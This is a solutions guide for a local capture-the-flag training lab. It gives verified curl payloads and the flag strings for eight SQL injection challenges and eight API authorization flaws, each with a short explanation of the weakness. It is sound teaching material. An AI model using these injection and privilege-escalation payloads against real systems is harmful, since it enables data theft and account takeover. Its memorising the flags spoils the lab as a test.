# Batch 02 Solutions — sqli (+8) and api (+8)

All commands assume the lab runs at `http://localhost:3000`. Every payload below
was verified against a live instance. URL-encode payloads when pasting them into
a browser address bar (curl `--data-urlencode` does this for you).

---

## sqli – SQL Injection

**1. ORDER BY Injection** – `PENTRIX{sqli_order-by}`

The `sort` parameter on `/sqli/sort` is interpolated straight into `ORDER BY`,
and `ORDER BY` accepts full expressions, not just column names. Smuggle in a
`CASE WHEN` boolean oracle that reads the users table:

```bash
curl -G 'http://localhost:3000/sqli/sort' \
  --data-urlencode "sort=(CASE WHEN (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' THEN name ELSE price END)"
```

Watch the row order: when the condition is true the table is sorted by name
(Bug Bounty Field Notes first); flip `'P'` to a wrong guess like `'X'` and the
table is sorted by price instead (Sticker Pack first). Each request answers one
yes/no question about the secret. The flag is awarded when the CASE-based oracle
against the users table runs successfully.

Why it works: `ORDER BY` evaluates any expression per row, so a conditional
expression turns the visible sort order into a boolean oracle.

**2. Second-Order SQL Injection** – `PENTRIX{sqli_second-order}`

Registration (`POST /sqli/register`) stores your display name with a prepared
statement, so the payload sleeps quietly. But `/sqli/profile` later interpolates
that stored value into a brand-new query:

```bash
# Step 1: plant the payload as your display name
curl -X POST 'http://localhost:3000/sqli/register' \
  --data-urlencode 'username=evil1' \
  --data-urlencode "display_name=admin'--" \
  --data-urlencode 'password=x'

# Step 2: trigger it by viewing your profile
curl 'http://localhost:3000/sqli/profile?u=evil1'
```

The profile page runs `SELECT * FROM users WHERE username='admin'--'` and lands
on the admin account, displaying its secret and awarding the flag. The injection
fires on read, not on write.

Why it works: input that is safe at rest becomes SQL when it is concatenated
into a later query; the trust boundary moved from the form to the database.

**3. LIKE Wildcard Injection** – `PENTRIX{sqli_like-wildcard}`

`/sqli/wildcard` drops your term into `LIKE '%q%'` without escaping the pattern
characters `%` and `_`:

```bash
curl -G 'http://localhost:3000/sqli/wildcard' --data-urlencode 'q=%'
```

A single `%` matches everything, so one request dumps the whole catalog. `_`
works the same way for single characters (try `q=B_g` to see partial matching).

Why it works: `%` and `_` are wildcards inside `LIKE`, and the app never escapes
them, so attacker-controlled wildcards widen the match to rows the search
should not return.

**4. LIMIT/OFFSET Injection** – `PENTRIX{sqli_limit-offset}`

`/sqli/paged` shows 2 products, but `limit` is interpolated raw into the `LIMIT`
clause, and `LIMIT` accepts more than a plain number:

```bash
curl 'http://localhost:3000/sqli/paged?limit=-1'   # SQLite: -1 means no limit
curl 'http://localhost:3000/sqli/paged?limit=1,10'  # offset,count form
```

Both dump every product instead of the default page of 2, and the flag is
awarded for genuine LIMIT-syntax injection (a plain number like `limit=10`
dumps rows too, but earns nothing).

Why it works: the numeric context was never validated, so SQL clause syntax
(`-1`, `offset,count`) is accepted where only a page size was intended.

**5. GROUP BY Injection** – `PENTRIX{sqli_groupby-having}`

`/sqli/stats` groups sales by the `by` parameter and prints the grouping key in
the first column. `GROUP BY` accepts any expression, including a subquery:

```bash
curl -G 'http://localhost:3000/sqli/stats' \
  --data-urlencode "by=(SELECT secret FROM users WHERE username='admin')"
```

Every row collapses into one group whose key is the admin secret, which renders
in the Group column and triggers the flag.

Why it works: the grouping expression is attacker-controlled and echoed back,
so pointing it at the users table exfiltrates data through the group key.

**6. UNION Filter Bypass** – `PENTRIX{sqli_union-filter-bypass}`

`/sqli/shop` strips only the exact lowercase word `union` from your search. The
filter is case-sensitive and comment-blind:

```bash
curl -G 'http://localhost:3000/sqli/shop' \
  --data-urlencode "q=' UNION SELECT id,username,password,secret FROM users-- "
```

Uppercase `UNION` sails through and dumps the users table, including the admin
secret. Variants that also work: mixed case (`uNiOn`) and inline comments
(`'/**/UNION/**/SELECT`). Lowercase `union` gets mangled into a database error,
which is the filter "working".

Why it works: blacklist filters that do not understand SQL case-insensitivity
or comment syntax are trivially bypassed with equivalent spellings.

**7. INSERT Injection** – `PENTRIX{sqli_insert-inject}`

The feedback form at `/sqli/feedback` interpolates your input into
`INSERT INTO sqli_feedback(name, message) VALUES ('...', '...')`. Stacked
queries are blocked, but `VALUES()` accepts a subquery as a value:

```bash
curl -X POST 'http://localhost:3000/sqli/feedback' \
  --data-urlencode "name=x', (SELECT secret FROM users WHERE username='admin')) -- " \
  --data-urlencode 'message=hello'
curl 'http://localhost:3000/sqli/feedback'
```

The resulting SQL is
`VALUES ('x', (SELECT secret FROM users WHERE username='admin')) -- ', 'hello')`,
so your feedback row's message becomes the admin secret. Viewing the feedback
wall awards the flag.

Why it works: breaking out of the VALUES list lets a scalar subquery supply a
column value, turning an INSERT into a read primitive.

**8. Error-based Injection (Runtime Errors)** – `PENTRIX{sqli_error-cast}`

`/sqli/cast` leaks raw database errors like the syntax-error lab, but a plain
stray quote earns nothing here. Trigger a *runtime* error instead:

```bash
# malformed JSON inside a function call
curl -G 'http://localhost:3000/sqli/cast' \
  --data-urlencode "id=json_extract('{{{','\$.a')"

# alternative: reference a column that does not exist
curl -G 'http://localhost:3000/sqli/cast' --data-urlencode 'id=nosuchcol'
```

The page shows `SQL error: malformed JSON` (or `no such column`) and awards the
flag. Because `CASE WHEN` short-circuits, this oracle extends to full boolean
extraction, e.g.
`id=1 AND (SELECT CASE WHEN (substr((SELECT secret FROM users WHERE username='admin'),1,1)='P') THEN json_extract('{{{','$.a') ELSE 1 END)`.

Why it works: SQLite distinguishes parse-time syntax errors from runtime
failures, and runtime errors (bad function input, missing columns) make a
separate, equally usable oracle.

---

## api – API Security Flaws

Log in once per session for the authenticated labs:

```bash
curl -c c.txt http://localhost:3000/api/login/alice
```

**1. BOLA: Order Access** – `PENTRIX{api_bola-orders}`

`GET /api/v1/orders/:id` trusts the id and never checks ownership:

```bash
curl -b c.txt http://localhost:3000/api/v1/orders/1   # your own order
curl -b c.txt http://localhost:3000/api/v1/orders/2   # bob's order, address included
```

Reading order 2 as alice returns another user's order (with their address) and
awards the flag.

Why it works: broken object-level authorization; the endpoint resolves the
object id without verifying it belongs to the caller.

**2. Mass Assignment: Role** – `PENTRIX{api_mass-assign-role}`

`PATCH /api/v1/users/:id` builds its SQL SET clause from every key in the JSON
body, with no allowlist:

```bash
curl -b c.txt -X PATCH http://localhost:3000/api/v1/users/2 \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
```

The response shows your role flipped to admin and the flag is awarded.

Why it works: client-controlled keys become columns in the UPDATE, so `role`
is writable even though no UI ever sends it.

**3. API Key Exposure** – `PENTRIX{api_data-exposure-keys}`

`GET /api/v1/me` bundles a secret API key into the profile response:

```bash
curl -b c.txt http://localhost:3000/api/v1/me
```

The JSON contains `api_secret` (e.g. `ak_live_alice_9f2c41`), a credential the
client should never see. Fetching it awards the flag.

Why it works: excessive data exposure; the server serializes internal secrets
into a client-facing response.

**4. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{api_ratelimit-xff}`

`POST /api/v1/login` locks an IP out after 3 bad attempts, but the "client IP"
is read from the `X-Forwarded-For` header, which you control:

```bash
# burn the 3 attempts for your real IP
for i in 1 2 3 4; do
  curl -s -X POST http://localhost:3000/api/v1/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"wrong"}'
done
# 4th attempt: 429 Too many attempts. The real password is locked out too:
curl -s -X POST http://localhost:3000/api/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}'   # still 429
# change your "IP" and walk in
curl -s -X POST http://localhost:3000/api/v1/login \
  -H 'Content-Type: application/json' -H 'X-Forwarded-For: 10.9.9.9' \
  -d '{"username":"alice","password":"alice123"}'   # ok:true + flag
```

The flag is awarded when the real IP is locked out yet the login succeeds under
a spoofed header.

Why it works: rate-limit identity comes from a client-controlled header, so the
attacker gets a fresh quota by spoofing a new IP per attempt.

**5. Unsafe PUT: Read-only Field Overwrite** – `PENTRIX{api_unsafe-put}`

`PUT /api/v1/profile` replaces your profile object and copies every key you
send, including the read-only `is_admin` flag:

```bash
curl -b c.txt -X PUT http://localhost:3000/api/v1/profile \
  -H 'Content-Type: application/json' \
  -d '{"display_name":"alice","is_admin":1}'
```

The response shows `is_admin: 1` and the flag is awarded.

Why it works: PUT full-object replacement with no field allowlist lets the
client overwrite server-managed fields.

**6. API Version AuthZ Bypass** – `PENTRIX{api_api-version-bypass}`

`GET /api/v1/users/:id` enforces "your own record, or admin". The v2 copy
forgot the check:

```bash
curl -b c.txt http://localhost:3000/api/v1/users/3   # 403 Forbidden
curl -b c.txt http://localhost:3000/api/v2/users/3   # bob's full record + flag
```

The v2 response includes bob's password hash and secret.

Why it works: the authorization check was not carried over when the endpoint
was versioned, so the new route exposes what the old one protects.

**7. IDOR: Invoice Enumeration** – `PENTRIX{api_id-enumeration}`

Invoice ids are sequential and `GET /api/v1/invoices/:id` does not check
ownership:

```bash
curl -b c.txt http://localhost:3000/api/v1/invoices/1   # yours
curl -b c.txt http://localhost:3000/api/v1/invoices/2   # someone else's + flag
```

Why it works: predictable identifiers plus missing ownership check turn id
guessing into cross-user data access.

**8. PATCH Self-Privilege Escalation** – `PENTRIX{api_patch-self-admin}`

`PATCH /api/v1/me` is meant for `display_name` and `bio`, but there is no
allowlist:

```bash
curl -b c.txt -X PATCH http://localhost:3000/api/v1/me \
  -H 'Content-Type: application/json' \
  -d '{"is_admin":1}'
```

The response shows `is_admin: 1` and the flag is awarded. A benign
`{"bio":"hello"}` patch earns nothing, proving the flag is tied to the
privilege field.

Why it works: partial-update endpoints that merge arbitrary keys into the
record let the client promote itself.
